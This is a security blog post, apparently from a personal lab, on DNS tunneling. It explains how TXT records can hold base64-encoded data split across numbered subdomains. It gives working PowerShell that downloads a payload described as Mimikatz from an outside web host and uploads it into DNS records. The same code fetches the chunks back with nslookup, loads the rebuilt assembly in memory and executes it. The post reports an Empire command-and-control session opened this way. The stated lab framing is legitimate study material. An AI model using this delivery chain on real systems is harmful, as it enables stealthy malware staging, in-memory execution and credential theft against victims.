                                We have seen in a previous article (<a href="namedpipes.html">Named Pipes</a>) that it was possible to send and receive some data from a server to a client through a tunnel or a channel. Instead of using the Named Pipes, the well known protocol for Internet, DNS, will be used to transfer the data. <br>
                                <br>
                                <h4>Definition</h4>
                                The domain name system is mainly used for identifying systems through Internet. Any system connected to Internet must have a IP address. But as human, it is complicated to remember all the different IP address and easier to remember a domain name such as "google.com". DNS will map the human-friendly domain name to the numerical IP address of the computer. <br>
                                DNS has been created in the very early days of Internet and DNS Tunneling is clearly not a very recent discovery, it has been around for a very long time. Despite it is a old and well known technique, many organizations still have difficulties to detect and prevent it. Usually, adversaries use DNS Tunneling for data exfiltration but in more recent malicious activity, DNS Tunneling has been also used to beacon a Command & Control (Cobalt Strike). <br>
                                <br>
                                <h4>DNS records</h4>
                                Every domain has its own resource records, which is a list of records type link to the domain. Each record has at least a type and a value. There are a few types of DNS records : A (IPv4), AAAA (IPv6), MX (domain name), NS (domain name) and TXT (string). If an adversary is looking for a way to extract data or to store potential malicious data, he might store it in the TXT record since it accept strings and is the DNS type records that can contain the most of characters. The string limit per TXT records is 255, which means that several TXT records will be necessary for the attacker to successfully perform the attack. We know that executable file is not only fully human readable characters, but in order to transform into a fully human readable character, the common encoding method is base64. Base64 is composed of characters ‘A-Z’, ‘a-z’, ‘0-9’, ‘+’, ‘=’, ‘/’. <br>
                                <br>
                                <h4>Important notes</h4>
                                Before storing the information in the TXT record of the DNS, some things have to be taken into account:
                                <ul>
                                    <li>Not-in-order problem: There is no guarantee that the TXT record will be returned in order. Since that we need to recreate the executable from the base64, we need to make sure that it comes in order.</li>
                                    <li>Duplicate result will not be display, only one result will be displayed. It is very common for a PowerShell script to have a lot of A when the hex is convert as a base64. Therefore, If there are several time 255 ‘A’, the TXT record will only show one 255 ‘A’.</li>
                                </ul>                                
                                To avoid those issues, it is necessary to create subdomains and store 255 strings on the TXT records. <br>
                                <br>
                                <h4>POC</h4>
                                I've created a Windows Server that host a DNS server for this test.
                                <img src="img/dnstunneling/dnsserver.jpg" class="img-fluid" width="700">
                                Let's create manually some TXT records in the DNS.
                                <img src="img/dnstunneling/dnsserverrecordadded.jpg" class="img-fluid" width="700">
                                Nslookup is a network administration command-line to obtain some DNS information about a domain name. In the current DNS server, I have created some TXT records named 0, 1, 2, 3 because it is easier to call them in this way when we need to make a loop in our script to get those TXT records in the correct order.

                                <div class="squarebox">For($i=0; $i -lt $numberofdomain; $i++){nslookup -q=txt $i}[-1]</div>

                                Since that the result of nslookup stores the value at the last position of a array, the "[-1]" is used to get the last value of an array.
                                <img src="img/dnstunneling/nslookup_1.jpg" class="img-fluid" width="700">
                                Looking at the output, some tabulation characters and double quotes have to be removed from the string.
                                <div class="squarebox">$string.replace(“`t”, “”).replace(“`””,””)}</div>
                                If we need to recreate a PE file, we must concatenate the data present in each subdomain, let's try to concatenate the value of those subdomains.
                                <div class="squarebox">For($i=0; $i -lt $numberofdomain; $i++){$temp = (nslookup -q=txt $i”.persolab.info”)[-1]; $result = $result + $temp.replace(“`t”, “”).replace(“`””,””)};Write-Host($result);</div>
                                <img src="img/dnstunneling/concatenate.jpg" class="img-fluid" width="700">

                                <h4>Exploit</h4>
                                <h5 style="color: slategrey;">Mimikatz</h5>
                                We have previously made some tests by adding some data manually in the DNS server, however if the payload contain more than 10 000 characters, it is better to automate this task. To add DNS record in PowerShell, it exists a method called "Add-DnsServerResourceRecord".

                                <div class="squarebox">Add-DnsServerResourceRecord -DescriptiveText "This is a test" -Name Test -Txt -ZoneName persolab.info</div>
                                Let's retrieve a payload from my own web application by calling a DownloadString("https://hakkyahud.github.io/password.html"). Before writing our script, we need to determine the amount of subdomain. To do so, let's divide the amount of characters by 254.
                                <div class="squarebox">[math]::ceiling($payload.length/254)</div>
                                Once the number of subdomain has been determined, <strong>let's script it :)</strong> <br>
                                <div class="squarebox">
                                    $payload = (New-Object Net.WebClient).DownloadString("https://hakkyahud.github.io/password.html"); <br>
                                    $numberofsubdomain = [math]::ceiling($payload.length/254); <br>
                                    $domainname = "persolab.info"; <br>
                                    for($i = 0; $i -lt $numberofsubdomain; $i++){<br>
                                    &emsp;try{ <br>
                                    &emsp;&emsp;$substring = $payload.substring(254*$i,254); //take from 254*i and add 254 following characters <br>
                                    &emsp;&emsp;Add-DnsServerResourceRecord -DescriptiveText $substring -Name $i -Txt -ZoneName $domainname; <br>
                                    &emsp;}<br>
                                    &emsp;catch [ArgumentOutOfRangeException]{ <br>
                                    &emsp;&emsp;$substring = $payload.substring(254*i, $payload.length-(254*$i)); //To not go outside of the buffer <br>
                                    &emsp;&emsp;Add-DnsServerResourceRecord -DescriptiveText $substring -Name $i -Txt -ZoneName $domainname; <br>
                                    &emsp;} <br>
                                    }
                                </div>
                                It works perfectly, there are so many subdomains that I cannot tell you how many is stored in the DNS server at the moment.
                                <img src="img/dnstunneling/dnskatzpayload.jpg" class="img-fluid" width="700">
                                Let's make some calculation
                                <img src="img/dnstunneling/payloadlenght.jpg" class="img-fluid" width="700">
                                In this current payload, there are 4 839 426 characters and by dividing by 254, the DNS server have created 19053 subdomains. <br>
                                <div class="squarebox">
                                    $numberofsubdomain = 19053; <br>
                                    For($i=0; $i -lt $numberofdomain; $i++){ <br>
                                    &emsp;$temp = (nslookup -q=txt $i”.persolab.info”)[-1]; <br>
                                    &emsp;$result = $result + $temp.replace(“`t”, “”).replace(“`””,””)<br>
                                    }<br>
                                    $byte = [System.Convert]::FromBase64String($result); <br>
                                    $assembly = [System.Reflection.Assembly].Load($byte); <br>
                                    $assembly.EntryPoint.Invoke($null, $null);
                                </div>

                                Since that we have 19053 subdomains, the loop goes from 0 to (19053-1) and I counted that the time to receive the DNS response from the DNS server takes around 3 seconds. With the 19053 subdomains that we have, if we are multiplying by 3, it is around 57159 seconds and by dividing by 3600 it becomes 16 hours to recreate the payload... <br>

                                <br>
                                After running the program 3 hours, I've stopped it and decided to find another payload. I was thinking a stager to connect to a <strong>Meterpreter</strong> session or <strong>Empire</strong> session. <br>
                                <br>

                                Empire session is opened ! We have reconstruct the payload from the 15 subdomains of our DNS. Everything has been done in local, but an attack could have gotten a new domain to perform such a attack. By doing such a activity, it is very noisy in the network, the victim computer is requesting a lot of subdomains and the data size is quite huge.
